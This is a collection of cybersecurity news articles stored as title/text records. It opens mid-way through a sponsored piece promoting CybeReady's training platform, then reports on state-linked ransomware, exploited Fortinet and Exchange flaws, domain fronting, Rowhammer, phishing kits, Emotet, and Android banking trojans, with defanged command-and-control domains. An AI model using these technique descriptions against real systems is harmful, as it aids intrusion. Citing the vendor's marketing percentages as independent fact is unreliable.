between them and the organizational risk, illustrating the need for cybersecurity awareness training in the first place. Moreover, when security events include real-time feedback, employees immediately understand the missteps and how to prevent similar situations in the future.\nCulture and the scientific training method\nCyber security awareness must be ingrained in the organization’s daily practices without feeling like a daily grind. Organizations should make training an engaging, effortless, and seamless part of employees’ daily routines, regularly encouraging continuous learning via small digestible security awareness learning bites.\nBehind effective cyber security training is often a scientific method. A next gen approach to security awareness training should focus bringing together learning expertise, data science, and automation. \nHow to Measure Progress\nHaving a training program in place is a great start, but organizations must ask themselves: how do I know if my security awareness training is working? \nOrganizations usually rely solely at click rates (e.g. how many employees click on phishing simulations) to measure success. And this is precisely where they go wrong.\nCompanies must focus on progress over time, and not just measure participation. \nWhen measuring the success of a security awareness program, it’s all about context. \nCompanies should look for qualitative, not simply quantitative results. For instance, if a company sends out three phishing simulations over a year, there is no way of knowing whether one was sent while an employee was on vacation or if an employee clicked because they were new to the company or whether the email went unnoticed due to a flurry of meetings and other tasks.\nImage credit: CybeReady\nWhen progress is measured instead of participation, teams get a clear view of the benefits of a security awareness training solution over time. Instead of looking at the company as one block of employees, it would be worthwhile to approach them individually with specific strengths and weaknesses. To evaluate the impact of your security awareness training, you need actionable data to identify valuable metrics such as:\nHigh-risk employees: The number of employees who fail to learn at a good pace and avoid more scams over time.Resilience: The level of security awareness in the company or even within specific teams.Meantime between failures: Proving that employee learning is occurring and that retention is improving over time. In machinery, MTBF is used to measure the amount of time since the machine failed last. In the security awareness industry, MTBF shows the resilience of an organization. If employees have fewer simulation failures and mistakes are decreasing, the employees are acquiring knowledge from the program, and best of all – retaining it.\nImage credit: CybeReady\nAn effective security awareness program requires the right platform\nSecurity professionals who wish to address security risks in their organizations need to ensure that their employees know daily security risks. An ongoing, employee-centric, and engaging security awareness program is one of the best ways to have vigilant employees. \nOrganizations must foster security awareness to build a culture of readiness to mitigate security risks effectively. CybeReady addresses this by offering a fully autonomous, data-driven security readiness platform that delivers, measures, and optimizes complete out-of-the-box awareness training that is continuous, contextual, and adaptive.\nImage credit: CybeReady\nCybeReady’s Security Awareness Training platform offers key capabilities :\nTraining and simulation content is adapted based on employee role and localeTraining and simulation content and frequency auto-adapt to mitigate measured risksNo IT effort required One-click executive reportingMeasurements provide progress improvements metricsProven results :\n200% higher employee engagement \n400% increase in Employee Resilience Score (within 12 months)\n80% reduction in high-risk group size \nFinal thoughts\nDespite the broad adoption of first-generation security awareness solutions, the human element continues to be a primary catalyst for data breaches, with phishing accounting for 36% of breaches. This means that organizations need to turn security awareness into a readiness culture to mitigate security risks effectively. \nCybeReady empowers enterprises with a comprehensive human-centric security awareness training program that is easy to deploy, operate and measure.\nGet started with a cybersecurity training program that really works\n\n\nFound this article interesting?

'text': 'Nation-state operators with nexus to Iran are increasingly turning to ransomware as a means of generating revenue and intentionally sabotaging their targets, while also engaging in patient and persistent social engineering campaigns and aggressive brute force attacks.\nNo less than six threat actors affiliated with the West Asian country have been discovered deploying ransomware to achieve their strategic objectives, researchers from Microsoft Threat Intelligence Center (MSTIC) revealed, adding “these ransomware deployments were launched in waves every six to eight weeks on average.“\n\nOf note is a threat actor tracked as Phosphorus (aka Charming Kitten or APT35), which has been found scanning IP addresses on the internet for unpatched Fortinet FortiOS SSL VPN and on-premises Exchange Servers to gain initial access and persistence on vulnerable networks, before moving to deploy additional payloads that enable the actors to pivot to other machines and deploy ransomware.\nAnother tactic incorporated into the playbook is to leverage a network of fictitious social media accounts, including posing as attractive women, to build trust with targets over several months and ultimately deliver malware-laced documents that allow for data exfiltration from the victim systems. Both Phosphorus and a second threat actor dubbed Curium have been spotted incorporating such “patient“ social engineering methods to compromise their targets\n\n“The attackers build a relationship with target users over time by having constant and continuous communications which allows them to build trust and confidence with the target,“ MSTIC researchers said. In many of the cases we have observed, the targets genuinely believed that they were making a human connection and not interacting with a threat actor operating from Iran.“\nA third trend is the use of password spray attacks to target Office 365 tenants targeting U.S., E.U., and Israeli defense technology companies, details of which Microsoft publicized last month, while attributing it to an emerging threat cluster DEV-0343.\n\nFurthermore, the hacker groups have also demonstrated the capability to adapt and shape-shift depending on their strategic goals and tradecraft, evolving into “more competent threat actors“ proficient in disruption and information operations by conducting a spectrum of attacks, such as cyber espionage, phishing and password spraying attacks, employing mobile malware, wipers and ransomware, and even carrying out supply chain attacks.\nThe findings are especially significant in light of a new alert issued by cybersecurity agencies from Australia, the U.K., and U.S., warning of an ongoing wave of intrusions carried out by Iranian government-sponsored hacking groups by exploiting Microsoft Exchange ProxyShell and Fortinet vulnerabilities.\n“These Iranian government-sponsored APT actors can leverage this access for follow-on operations, such as data exfiltration or encryption, ransomware, and extortion,“ the agencies said in a joint bulletin published Wednesday.\n\n\nFound this article interesting?

'text': 'Cybersecurity agencies from Australia, the U.K., and the U.S. on Wednesday released a joint advisory warning of active exploitation of Fortinet and Microsoft Exchange ProxyShell vulnerabilities by Iranian state-sponsored actors to gain initial access to vulnerable systems for follow-on activities, including data exfiltration and ransomware.\nThe threat actor is believed to have leveraged multiple Fortinet FortiOS vulnerabilities dating back to March 2021 as well as a remote code execution flaw affecting Microsoft Exchange Servers since at least October 2021, according to the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), the Australian Cyber Security Centre (ACSC), and the U.K.’s National Cyber Security Centre (NCSC).The agencies did not attribute the activities to a specific advanced persistent threat (APT) actor. Targeted victims include Australian organizations and a wide range of entities across multiple U.S. critical infrastructure sectors, such as transportation and healthcare. The list of flaws being exploited are below —\n\nCVE-2021-34473 (CVSS score: 9.1) - Microsoft Exchange Server remote code execution vulnerability (aka “ProxyShell“)CVE-2020-12812 (CVSS score: 9.8) - FortiOS SSL VPN 2FA bypass by changing username caseCVE-2019-5591 (CVSS score: 6.5) - FortiGate default configuration does not verify the LDAP server identityCVE-2018-13379 (CVSS score: 9.8) - FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests\nBesides exploiting the ProxyShell flaw to gain access to vulnerable networks, CISA and FBI said they observed the adversary abusing a Fortigate appliance in May 2021 to gain a foothold to a web server hosting the domain for a U.S. municipal government. The next month, the APT actors “exploited a Fortigate appliance to access environmental control networks associated with a U.S.-based hospital specializing in healthcare for children,“ the advisory said.\n\nThe development marks the second time the U.S. government has alerted of advanced persistent threat groups targeting Fortinet FortiOS servers by leveraging CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591 to compromise systems belonging to government and commercial entities.\nAs mitigations, the agencies are recommending organizations to immediately patch software affected by the aforementioned vulnerabilities, enforce data backup and restoration procedures, implement network segmentation, secure accounts with multi-factor authentication, and patch operating systems, software, and firmware as and when updates are released.\n\n\nFound this article interesting?

{'title': 'Hackers Targeting Myanmar Use Domain Fronting to Hide Malicious Activities',
'text': 'A malicious campaign has been found leveraging a technique called domain fronting to hide command-and-control traffic by leveraging a legitimate domain owned by the Myanmar government to route communications to an attacker-controlled server with the goal of evading detection.\nThe threat, which was observed in September 2021, deployed Cobalt Strike payloads as a stepping stone for launching further attacks, with the adversary using a domain associated with the Myanmar Digital News network, a state-owned digital newspaper, as a front for their Beacons.\n“When the Beacon is launched, it will submit a DNS request for a legitimate high-reputation domain hosted behind Cloudflare infrastructure and modify the subsequent HTTPs requests header to instruct the CDN to direct the traffic to an attacker-controlled host,“ Cisco Talos researchers Chetan Raghuprasad, Vanja Svajcer, and Asheer Malhotra said in a technical analysis published Tuesday.\n\nOriginally released in 2012 to address perceived shortcomings in the popular Metasploit penetration-testing and hacking framework, Cobalt Strike is a popular red team software that’s used by penetration testers to emulate threat actor activity in a network.\nBut as the utility simulates attacks by actually carrying out these attacks, the software has increasingly emerged as a formidable weapon in the hands of malware operators, who use it as an initial access payload that enables the attackers to carry out a diverse array of post-exploitation activities, including lateral movement and deploy a wide range of malware.\nCobalt Strike beacon traffic\nAlthough threat actors can obtain Cobalt Strike by purchasing the tool directly from the vendor’s website for $3,500 per user for a one-year license, it can also be bought on the dark web via underground hacking forums, or, alternatively, get their hands on cracked, illegitimate versions of the software.\nIn the latest campaign observed by Talos, the execution of the Beacon results in the victim machine sending the initial DNS request to the government-owned host, while the actual command-and-control (C2) traffic is stealthily redirected to an attacker-controlled server, effectively mimicking legitimate traffic patterns in an attempt to escape detection by security solutions.\n\n“While the default C2 domain was specified as www[.]mdn[.]gov[.]mm, the beacon’s traffic was redirected to the de-facto C2 test[.]softlemon[.]net via HTTP Get and POST metadata specified in the beacon’s configuration,“ the researchers said. “The DNS request for the initial host resolves to a Cloudflare-owned IP address that allows the attacker to employ domain fronting and send the traffic to the actual C2 host test[.]softlemon[.]net, also proxied by Cloudflare.“\nThe C2 server, however, is no longer active, according to the researchers, who noted that it’s a Windows server running Internet Information Services (IIS).\n“Domain fronting can be achieved with a redirect between the malicious server and the target. Malicious actors may misuse various content delivery networks (CDNs) to set up redirects of serving content to the content served by attacker-controlled C2 hosts,“ the researchers said. “Defenders should monitor their network traffic even to high reputation domains in order to identify the potential domain fronting attacks with Cobalt Strike and other offensive tools.“\n\n\nFound this article interesting?

{'title': 'Israel’s Candiru Spyware Found Linked to Watering Hole Attacks in U.K and Middle East',
'text': 'Israeli spyware vendor Candiru, which was added to an economic blocklist by the U.S. government this month, is said to have reportedly waged “watering hole“ attacks against high-profile entities in the U.K. and the Middle East, new findings reveal.\n“The victimized websites belong to media outlets in the U.K., Yemen, and Saudi Arabia, as well as to Hezbollah; to government institutions in Iran (Ministry of Foreign Affairs), Syria (including the Ministry of Electricity), and Yemen (including the Ministries of Interior and Finance); to internet service providers in Yemen and Syria; and to aerospace/military technology companies in Italy and South Africa,“ ESET said in a new report. “The attackers also created a website mimicking a medical trade fair in Germany.“\nThe strategic web compromises are believed to have occurred in two waves, the first commencing as early as March 2020 before ending in August 2020, and the second string of attacks beginning in January 2021 and lasting until early August 2021, when the targeted websites were stripped clean off the malicious scripts.\n\nWatering hole attacks are a form of highly targeted intrusions in that they tend to infect a specific group of end-users by backdooring websites that members of the group are known to frequent with the goal of opening a gateway into their machines for follow-on exploitation activities.\n“The compromised websites are only used as a jumping-off point to reach the final targets,“ the Slovak cybersecurity firm said, linking the second wave to a threat actor tracked by Kaspersky as Karkadann citing overlaps in the tactics, techniques, and procedures (TTPs). The Russian company described the group as targeting government bodies and news outlets in the Middle East since at least October 2020.\n\nThe original attack chains involved injecting JavaScript code into the websites from a remote attacker-controlled domain that’s designed to collect and exfiltrated I.P. geolocation and system information about the victim machine, opting to proceed further only if the operating system in question is either Windows or macOS, suggesting the campaign was orchestrated to target computers and not mobile devices. The final step led to a likely browser remote code execution exploit that enabled the attackers to hijack control of the machines.\nThe second wave observed in January 2021 was characterized by more stealth, as the JavaScript modifications were made to legitimate WordPress scripts (“wp-embed.min.js“) used by the websites instead of adding the malicious code straight to the main HTML page, using the method to load a script from a server under the attacker’s control. What’s more, the fingerprinting script also went beyond harvesting system metadata to capture the default language, the list of fonts supported by the browser, the time zone, and the list of browser plugins.\n\nThe exact exploit and the final payload delivered remain unknown as yet. “This shows that the operators choose to narrow the focus of their operations and that they don’t want to burn their zero-day exploits,“ ESET malware researcher Matthieu Faou said.\nThe campaign’s links to Candiru stems from the fact that some of the command-and-control servers utilized by the attackers are similar to domains previously identified as belonging to the Israeli company, not to mention feature browser-based remote code execution exploits in its arsenal, raising the possibility that “the operators of the watering holes are customers of Candiru.“\nESET also noted that the attackers ceased operations at the end of July 2021, coinciding with public disclosures about Candiru related to the use of multiple zero-day vulnerabilities in Chrome web browser to target victims located in Armenia. “It seems that the operators are taking a pause, probably in order to retool and make their campaign stealthier,“ Faou said. “We expect to see them back in the ensuing months.“\n\n\nFound this article interesting?

{'title': 'On-Demand Webinar: Into the Cryptoverse',
'text': 'In the span of a few years, cryptocurrencies have gone from laughingstock and novelty to a serious financial instrument, and a major sector in high-tech. The price of Bitcoin and Ethereum has gone from single dollars to thousands, and they’re increasingly in the mainstream. \nThis is undoubtedly a positive development, as it opens new avenues for finance, transactions, tech developments, and more. Unfortunately, no innovation is without its dark side, and the crypto industry is no exception. A new webinar from XDR provider Cynet (you can see it here) dives deeper into this dark corner to explore the intersection of cybersecurity and cryptocurrency. \nThe first question is how, exactly, cryptocurrency creates security vulnerabilities for organizations. There’s no single answer, and in many cases, the results are more indirect. This bears closer inspection, and the webinar, led by Cynet CyOps Analyst Ronen Ahdut, studies the different ways cryptocurrencies are used by attackers. \nInto the mainstream, for better or worse\nIt’s hard to argue that having greater access to financial tools is a bad thing, but the nature of cryptocurrency is ideal for threat actors to leverage against organizations and users. One of the most common ways this occurs is with ransomware. \nIn the past, ransomware attacks ran the risk of being easily detected – law enforcement can track the movement of fiat currencies through a banking network, and finding the data being stolen wasn’t impossibly difficult. Cryptocurrencies – especially “privacy-focused“ ones like Monero make it much harder to track and understand where funds are going, or who is behind them. \nSimilarly, cryptomining and cryptojacking tools have become incredibly popular tools deployed by malicious actors to leverage victims’ resources and impact their organizations. These new threats require different approaches to confront, and a deeper understanding of how they work. \nThe webinar discusses: \nThe basics of cryptocurrencies and the history behind the technology. To gain a deeper understanding of how and why cryptocurrencies have become popular among threat actors, it’s important to comprehend where they come from, and how their basic structure lends itself to these activities. The intersection of cryptocurrency and cybersecurity. Cryptocurrencies don’t exist in a vacuum, and as soon as they become potential threats, cybersecurity teams need to react and become aware of what the risks are. The intersection of these two fields is ripe for discovery. The techniques attackers use to infiltrate networks. Most crypto-based attacks aren’t overt brute force incidents. Instead, they require subtlety and stealth. To this end, attackers look for increasingly inventive ways to infiltrate networks and deploy their payloads long before anyone can detect them. How organizations can defend themselves, and how Cynet can help. It’s not enough to know that something is happening. To resolve the issue, organizations need the right mentality and the proper tools to defend themselves. The webinar will discuss techniques to detect, contain, mitigate, and defeat these attacks. It will also cover how Cynet can help organizations defend themselves. \nYou can watch the webinar now. Find the on-demand recording here. \n\n\nFound this article interesting?

'text': 'Meta, the company formerly known as Facebook, announced Tuesday that it took action against four separate malicious cyber groups from Pakistan and Syria who were found targeting people in Afghanistan, as well as journalists, humanitarian organizations, and anti-regime military forces in the West Asian country.\nThe Pakistani threat actor, dubbed SideCopy, is said to have used the platform to single out people with ties to the Afghan government, military and law enforcement in Kabul.\nThe campaign, which Meta dubbed as a “well-resourced and persistent operation,“ involved sending malicious links, often shortened using URL shortener services, to websites hosting malware between April and August of 2021, what with the operators posing as young women and tricking the recipients with romantic lures in a bid to make them click on phishing links or download trojanized chat applications.\n\nMeta’s threat intelligence analysts said these apps were a front for two distinct malware strains, a remote access trojan named PJobRAT, which was previously found targeting the Indian military forces, and a hitherto undocumented implant dubbed Mayhem that’s capable of retrieving contact lists, text messages, call logs, location information, media files, device metadata, and even scrape content on the device’s screen by abusing accessibility services.\nAmong other SideCopy’s tactics, the hacker group engaged in a number of nefarious activities, including operating rogue app stores, compromising legitimate websites to host malicious phishing pages that were designed to manipulate people into giving up their Facebook credentials. The group was purged from Facebook in August.\nFurthermore, Meta also said it disrupted three hacking networks linked to the Syrian government and specifically Syria’s Air Force Intelligence —\nSyrian Electronic Army aka APT-C-27, which targeted humanitarian organizations, journalists and activists in Southern Syria, critics of the government, and individuals associated with the anti-regime Free Syrian Army with phishing links to deliver a mix of commercially available and custom malware such as njRAT and HmzaRat that are engineered to harvest sensitive user information.\nAPT-C-37, which targeted people linked to the Free Syrian Army and military personnel affiliated with opposition forces with a commodity backdoor known as SandroRAT and an in-house developed malware family called SSLove via social engineering schemes that duped victims into visiting websites masquerading as Telegram, Facebook, YouTube, and WhatsApp as well as content focussed on Islam.\nA government-linked unnamed hacking group that targeted minority groups, activists, opposition in Southern Syria, Kurdish journalists, and members of the People’s Protection Units and Syria Civil Defense, with the operation manifesting in the form of social engineering attacks that entailed sharing links to websites hosting malware-laced apps mimicking WhatsApp and YouTube that installed SpyNote and Spymax remote administration tools on the devices.\n\n“To disrupt these malicious groups, we disabled their accounts, blocked their domains from being posted on our platform, shared information with our industry peers, security researchers and law enforcement, and alerted the people who we believe were targeted by these hackers,“ the social technology firm’s Mike Dvilyanski, head of cyber espionage investigations, and David Agranovich, director of threat disruption, said.\n\n\nFound this article interesting?

{'title': 'New Blacksmith Exploit Bypasses Current Rowhammer Attack Defenses',
'text': 'Cybersecurity researchers have demonstrated yet another variation of the Rowhammer attack affecting all DRAM (dynamic random-access memory) chips that bypasses currently deployed mitigations, thereby effectively compromising the security of the devices.\nThe new technique — dubbed “Blacksmith“ (CVE-2021-42114, CVSS score: 9.0) — is designed to trigger bit flips on target refresh rate-enabled DRAM chips with the help of novel “non-uniform and frequency-based“ memory access patterns, according to a study jointly published by academics from ETH Zurich, Vrije Universiteit Amsterdam, and Qualcomm Technologies.\n\nOriginally disclosed in 2014, Rowhammer refers to a fundamental hardware vulnerability that could be abused to alter or corrupt memory contents by taking advantage of DRAM’s tightly-packed, matrix-like memory cell architecture to repeatedly access certain rows (aka “aggressors“) that induces an electrical disturbance large enough to cause the capacitors in neighbouring rows to leak charge faster and flip bits stored in the “victim“ rows adjacent to them.\nA double-sided Rowhammer access pattern sandwiches a victim row in between two aggressor rows, maximizing the bit flips in the victim row. Another method called Half-Double, as established by Google researchers earlier this May, leverages the weak coupling between two memory rows that are not immediately adjacent to each other but one row removed to tamper with data stored in memory and, in principle, even gain unfettered access to the system.\n\nTo thwart attacks of this kind, modern memory modules come equipped with a dedicated in-memory defense mechanism called Target Row Refresh (TRR), which aims to detect the aggressor rows that are frequently accessed and refresh their neighbors before their charge leak results in data corruption, thus forestalling any possible bit flips.\nHowever, recent research such as TRRespass, SMASH, and Half-Double have determined that TRR-based mitigations alone are insufficient to fully protect devices against Rowhammer attacks. Blacksmith is the latest work to join the list of methods that can completely circumvent TRR protections to activate bit errors on TRR-enabled DDR4 devices.\n\nThe approach involves conducting a series of experiments to identify complex “non-uniform“ patterns in which different numbers of aggressor rows are hammered with different frequencies, phases and amplitudes that can still bypass TRR, with the study finding at least one pattern that triggered Rowhammer bit errors across 40 DDR4 devices from Samsung, Micron, SK Hynix, and an unnamed manufacturer.\nThat said, there might be a light at the end of the tunnel, what with TRR being replaced by a new line of defense called “refresh management“ in DDR5 DRAM modules, a mechanism that “keeps track of activations in a bank and issues selective refreshes to highly activated rows once a threshold has been reached.“\n“The tendency in DRAM manufacturing is to make the chips denser to pack more memory in the same size which inevitably results in increased interdependency between memory cells, making Rowhammer an ongoing problem,“ Google’s open-source team said last week, alongside announcing what’s called the Rowhammer Tester platform for “experimenting with new types of attacks and finding better Rowhammer mitigation techniques.“\n\n\nFound this article interesting?

{'title': 'Researchers Demonstrate New Way to Detect MitM Phishing Kits in the Wild',
'text': 'No fewer than 1,220 Man-in-the-Middle (MitM) phishing websites have been discovered as targeting popular online services like Instagram, Google, PayPal, Apple, Twitter, and LinkedIn with the goal of hijacking users’ credentials and carrying out further follow-on attacks.\nThe findings come from a new study undertaken by a group of researchers from Stony Brook University and Palo Alto Networks, who have demonstrated a new fingerprinting technique that makes it possible to identify MitM phishing kits in the wild by leveraging their intrinsic network-level properties, effectively automating the discovery and analysis of phishing websites.\nDubbed “PHOCA“ — named after the Latin word for “seals“ — the tool not only facilitates the discovery of previously unseen MitM phishing toolkits, but also can be used to detect and isolate malicious requests coming from such servers.\n\nPhishing toolkits aim to automate and streamline the work required by attackers to conduct credential-stealing campaigns. They are packaged ZIP files that come with ready-to-use email phishing templates and static copies of web pages from legitimate websites, allowing threat actors to impersonate the targeted entities in a bid to trick unsuspecting victims into disclosing private information.\nBut the increasing adoption of two-factor authentication (2FA) by online services in recent years meant that these traditional phishing toolkits can no longer be an effective method to break into accounts protected by the extra layer of security. Enter MitM phishing toolkits, which go a step further by altogether obviating the need for maintaining “realistic“ web pages.\n\nA MitM phishing toolkit enables fraudsters to sit between a victim and an online service. Rather than setting up a bogus website that’s distributed via spam emails, the attackers deploy a counterfeit website that mirrors the live content of the target website and acts as a conduit to forward requests and responses between the two parties in real-time, thus permitting the extraction of credentials and session cookies from 2FA-authenticated accounts.\n“They function as reverse proxy servers, brokering communication between victim users and target web servers, all while harvesting sensitive information from the network data in transit,“ Stony Brook University researchers Brian Kondracki, Babak Amin Azad, Oleksii Starov, and Nick Nikiforakis said in an accompanying paper.\nThe method devised by the researchers involves a machine learning classifier that utilizes network-level features such as TLS fingerprints and network timing discrepancies to classify phishing websites hosted by MitM phishing toolkits on reverse proxy servers. It also entails a data-collection framework that monitors and crawls suspicious URLs from open-source phishing databases like OpenPhish and PhishTank, among others.\n\nThe core idea is to measure the round-trip time (RTT) delays that arise out of placing a MitM phishing kit, which, in turn, increases the duration from when the victim browser sends a request to when it receives a response from the target server owing to the fact that the reverse proxy mediates the communication sessions.\n“As two distinct HTTPS sessions must be maintained to broker communication between the victim user and target web server, the ratio of various packet RTTs, such as a TCP SYN/ACK request and HTTP GET request, will be much higher when communicating with a reverse proxy server than with an origin web server directly,“ the researchers explained. “This ratio is further magnified when the reverse proxy server intercepts TLS requests, which holds true for MitM phishing toolkits.“\n\nIn an experimental evaluation that lasted 365 days between March 25, 2020 and March 25, 2021, the study uncovered a total of 1,220 sites as operated using MitM phishing kits that were scattered primarily across the U.S. and Europe, and relied on hosting services from Amazon, DigitalOcean, Microsoft, and Google. Some of the brands that were most targeted by such kits include Instagram, Google, Facebook, Microsoft Outlook, PayPal, Apple, Twitter, Coinbase, Yahoo, and LinkedIn.\n“PHOCA can be directly integrated into current web infrastructure such as phishing blocklist services to expand their coverage on MitM phishing toolkits, as well as popular websites to detect malicious requests originating from MitM phishing toolkits,“ the researchers said, adding that uniquely identifying MitM phishing toolkits can “enhance the ability of web-service providers to pinpoint malicious login requests and flag them before authentication is completed.“\n\n\nFound this article interesting?

{'title': 'Notorious Emotet Botnet Makes a Comeback with the Help of TrickBot Malware',
'text': 'The notorious Emotet malware is staging a comeback of sorts nearly 10 months after a coordinated law enforcement operation dismantled its command-and-control infrastructure in late January 2021.\nAccording to a new report from security researcher Luca Ebach, the infamous TrickBot malware is being used as an entry point to distribute what appears to be a new version of Emotet on systems previously infected by the former. The latest variant takes the form of a DLL file, with the first occurrence of the deployment being detected on November 14.\n\nEuropol dubbed Emotet as the “world’s most dangerous malware“ for its ability to act as a “door opener“ for threat actors to obtain unauthorized access, becoming a precursor to many critical data theft and ransomware attacks. Interestingly, the loader operation enabled other malware families such as Trickbot, QakBot, and Ryuk to enter a machine.\n\nThe resurfacing is also significant not least because it follows concerted efforts on the part of the law enforcement to automatically uninstall the malware en masse from the compromised computers in April.\n\nAs of writing, malware tracking research project Abuse.ch’s Feodo Tracker shows nine Emotet command-and-control servers that are currently online, implying that the operators are trying to revive the botnet up and get it running again.\nSamples of the new Emotet loader can be accessed here. To prevent devices from being co-opted into the newly active Emotet botnet, network administrators are strongly recommended to block all the relevant IP addresses.\nUpdate: In a matter of less than 24 hours, the Emotet botnet has expanded its botnet command-and-control (C2) infrastructure from 9 active C2 servers to 14 active C2 servers. “It seems to be very clear that Emotet is firing up its activity,“ Abuse.ch said in a tweet.\nThe increase in Emotet activity has also been accompanied by a surge in malspam campaigns, with select infection chains dropping the loader directly using macro-enabled Word and Excel documents attached to stolen email threads without relying on TrickBot.\n“[Emotet is] back and retooled. Code and infrastructure has had updates, it is better secured now. It must be somebody/somebodies with access to original source code,“ security researcher Kevin Beaumont tweeted.\n\n\nFound this article interesting?

'text': 'A new politically-motivated hacker group named “Moses Staff“ has been linked to a wave of targeted attacks targeting Israeli organizations since September 2021 with the goal of plundering and leaking sensitive information prior to encrypting their networks, with no option to regain access or negotiate a ransom.\n“The group openly states that their motivation in attacking Israeli companies is to cause damage by leaking the stolen sensitive data and encrypting the victim’s networks, with no ransom demand,“ Check Point Research said in a report published Monday. “In the language of the attackers, their purpose is to ’Fight against the resistance and expose the crimes of the Zionists in the occupied territories.’“\nAt least 16 victims have had their data leaked to date, according to stats released by the collective.\n\nThe threat actor is said to leverage publicly known vulnerabilities as a means to breach enterprise servers and gain initial access, following it up with the deployment of a custom web shell that’s used to drop additional malware. Once inside, the intruders take advantage of living-off-the-land (LotL) techniques to laterally move across the network and deploy malware to lock the machines behind encryption barriers via a specially-crafted PyDCrypt malware.\n\nThe attacks specifically rely on the open-source library DiskCryptor to perform volume encryption, in addition to infecting the systems with a bootloader that prevents them from starting without the correct encryption key. The goal, the researchers said, is to disrupt operations and inflict “irreversible damage“ to the victims.\n\nThat said, the encrypted files can be recovered under certain scenarios since the group uses a symmetric key mechanism to generate the encryption keys. Check Point did not attribute the adversary to any specific country, citing lack of definitive evidence, but noted that some artifacts of the group’s toolset had been submitted to VirusTotal from Palestine months prior to the first attack.\n\nMoses Staff also operates on Twitter and Telegram to publicize their attacks, with malicious activity reported as recently as November 14. The group’s own website claims it has targeted over 257 websites as well as stolen data and documents amounting to 34 terabytes. What’s more, the online portal urges outside parties to join hands with them in “exposing the crimes of the Zionists in occupied Palestine.“\n“Moses Staff are still active, pushing provocative messages and videos in their social network accounts,“ the researchers said. “The vulnerabilities exploited in the group’s attacks are not zero days, and therefore all potential victims can protect themselves by immediately patching all publicly-facing systems.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Monday took the wraps off a new Android trojan that takes advantage of accessibility features on mobile devices to siphon credentials from banking and cryptocurrency services in Italy, the U.K., and the U.S.\nDubbed “SharkBot“ by Cleafy, the malware is designed to strike a total of 27 targets — counting 22 unnamed international banks in Italy and the U.K. as well as five cryptocurrency apps in the U.S. — at least since late October 2021 and is believed to be in its early stages of development, with no overlaps found to that of any known families.\n\n“The main goal of SharkBot is to initiate money transfers from the compromised devices via Automatic Transfer Systems (ATS) technique bypassing multi-factor authentication mechanisms (e.g., SCA),“ the researchers said in a report.\n“Once SharkBot is successfully installed in the victim’s device, attackers can obtain sensitive banking information through the abuse of Accessibility Services, such as credentials, personal information, current balance, etc., but also to perform gestures on the infected device.“ \n\nMasquerading as media player, live TV, or data recovery apps, SharkBot, like its other malware counterparts TeaBot and UBEL, repeatedly prompts users with rogue pop-ups to grant it wide permissions only to steal sensitive information. Where it stands apart is the exploitation of accessibility settings to carry out ATS attacks, which allow the operators to “auto-fill fields in legitimate mobile banking apps and initiate money transfers from the compromised devices to a money mule network controlled by the [threat actor].“\n\nThe modus operandi effectively obviates the need for enrolling a new device to perform fraudulent activities, while also bypassing two-factor authentication mechanisms put in place by the banking applications.\n\nIn addition, the malware comes with several features now observed across all Android banking trojans, such as the ability to perform overlay attacks to steal login credentials and credit card information, intercept legitimate banking communications sent through SMS, enable keylogging, and obtain full remote control of the compromised devices.\nSharkBot is also notable for the steps it takes to evade analysis and detection, including running emulator checks, encrypting command-and-control communications with a remote server, and hiding the app’s icon from the home screen post-installation. No samples of the malware have been detected on the official Google Play Store, implying that the malicious apps are installed on the users’ devices either via sideloading or social engineering schemes.\nThe discovery of SharkBot in the wild shows “how mobile malwares are quickly finding new ways to perform fraud, trying to bypass behavioural detection countermeasures put in place by multiple banks and financial services during the last years,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'Researchers Demonstrate New Fingerprinting Attack on Tor Encrypted Traffic',
'text': 'A new analysis of website fingerprinting (WF) attacks aimed at the Tor web browser has revealed that it’s possible for an adversary to glean a website frequented by a victim, but only in scenarios where the threat actor is interested in a specific subset of the websites visited by users.\n“While attacks can exceed 95% accuracy when monitoring a small set of five popular websites, indiscriminate (non-targeted) attacks against sets of 25 and 100 websites fail to exceed an accuracy of 80% and 60%, respectively,“ researchers Giovanni Cherubin, Rob Jansen, and Carmela Troncoso said in a newly published paper.\n\nTor browser offers “unlinkable communication“ to its users by routing internet traffic through an overlay network, consisting of more than six thousand relays, with the goal of anonymizing the originating location and usage from third parties conducting network surveillance or traffic analysis. It achieves this by building a circuit that traverses via an entry, middle, and exit relay, before forwarding the requests to the destination IP addresses.\n\nOn top of that, the requests are encrypted once for each relay to further hinder analysis and avoid information leakage. While the Tor clients themselves are not anonymous with respect to their entry relays, because the traffic is encrypted and the requests jump through multiple hops, the entry relays cannot identify the clients’ destination, just as the exit nodes cannot discern a client for the same reason.\n\nWebsite fingerprinting attacks on Tor aim to break these anonymity protections and enable an adversary observing the encrypted traffic patterns between a victim and the Tor network to predict the website visited by the victim. The threat model devised by the academics presupposes an attacker running an exit node — so as to capture the diversity of traffic generated by real users — which is then used as a source to collect Tor traffic traces and devise a machine-learning-based classification model atop the gathered information to infer users’ website visits.\n\nThe adversary model involves an “online training phase that uses observations of genuine Tor traffic collected from an exit relay (or relays) to continuously update the classification model over time,“ explained the researchers, who ran entry and exit relays for a week in July 2020 using a custom version of Tor v0.4.3.5 to extract the relevant exit information.\nTo mitigate any ethical and privacy concerns arising out of the study, the paper’s authors stressed the safety precautions incorporated to prevent leakage of sensitive websites that users may visit via the Tor browser.\n“The results of our real-world evaluation demonstrate that WF attacks can only be successful in the wild if the adversary aims to identify websites within a small set,“ the researchers concluded. “In other words, untargetted adversaries that aim to generally monitor users’ website visits will fail, but focused adversaries that target one particular client configuration and website may succeed.“\n\n\nFound this article interesting?

